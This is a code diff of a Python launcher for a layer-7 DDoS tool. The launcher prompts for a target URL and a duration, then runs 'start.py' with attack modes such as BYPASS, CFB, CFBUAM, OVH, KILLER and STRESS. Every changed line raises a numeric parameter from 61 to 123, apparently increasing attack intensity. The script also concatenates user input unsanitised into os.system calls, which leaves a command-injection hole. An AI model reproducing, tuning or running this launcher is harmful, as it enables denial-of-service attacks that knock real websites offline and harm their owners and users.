@@ -190,120 +190,119 @@ layer7input = input("""
 if layer7input == "SLOW":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py SLOW " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py SLOW " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "DOWNLOADER":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py DOWNLOADER " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py DOWNLOADER " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
     
 if layer7input == "BYPASS":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py BYPASS " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py BYPASS " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "DYN":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py DYN " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py DYN " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "PPS":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py PPS " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py PPS " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "HEAD":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py HEAD " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py HEAD " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "APACHE":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py APACHE " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py APACHE " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "KILLER":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py KILLER " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py KILLER " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "CFB":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py CFB " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py CFB " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "COOKIE":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py COOKIE " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py COOKIE " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "BOMB":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py BOMB " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py BOMB " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "EVEN":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py EVEN " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py EVEN " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "TOR":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py TOR " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py TOR " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "DGB":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py DGB " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py DGB " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "NULL":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py NULL " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py NULL " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "OVH":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py OVH " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py OVH " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "AVB":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py AVB " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py AVB " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "POST":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py POST " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py POST " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "XMLRPC":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py XMLRPC " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py XMLRPC " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "GET":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py GET " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py GET " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "CFBUAM":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py CFBUAM " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py CFBUAM " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "BOT":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py BOT " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py BOT " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "STRESS":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py STRESS " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
+    os.system("cd files/dont_look && python3 start.py STRESS " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
 
 if layer7input == "GSB":
     url = input(f"url ══ ")
     timeudp = input(f"time ══ ")
-    os.system("cd files/dont_look && python3 start.py GSB " + url + " 5 " + " 500 " + "no_proxy.txt" + " 61 " + timeudp)
-    
+    os.system("cd files/dont_look && python3 start.py GSB " + url + " 5 " + " 500 " + "no_proxy.txt" + " 123 " + timeudp)
